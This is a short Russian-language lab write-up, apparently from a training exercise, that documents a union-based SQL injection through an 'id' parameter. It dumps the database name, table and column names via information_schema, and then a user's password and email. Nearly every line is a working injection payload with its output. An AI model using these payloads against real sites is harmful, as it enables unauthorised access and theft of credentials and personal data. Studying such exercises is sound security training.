## Название бызы

```
?id=-1' UNION SELECT 1, database(), 3 --+

Ваш id:1
Ваш логин:security
```

## Еазвание таблиц

```
?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE 'a%' --+

Меняя 'a%' на 'b%', 'c%' и так далее, можно перебрать названия таблиц.
Я получил:
emails
users
```

## Название колонок
```
?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'users' --+
колонка USER

?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'emails' --+
колонка id
```
## На удачу попробовал
```
Попробовал ?id=-1' UNION SELECT 1, password, 3 FROM users WHERE username = 'Volk2' --+
и получил:
Ваш id:1
Ваш логин:Wa spoiuuuuu
```
``
?id=-1' UNION SELECT 1, id, 3 FROM users WHERE username = 'Vinni-pukh' --+
Ваш id:1
Ваш логин:4

на запрос ?id=-1' UNION SELECT 1, email_id, 3 FROM emails WHERE id = 4 --+
я получил

Ваш id:1
Ваш логин:honey_lover@otus-lab.com
```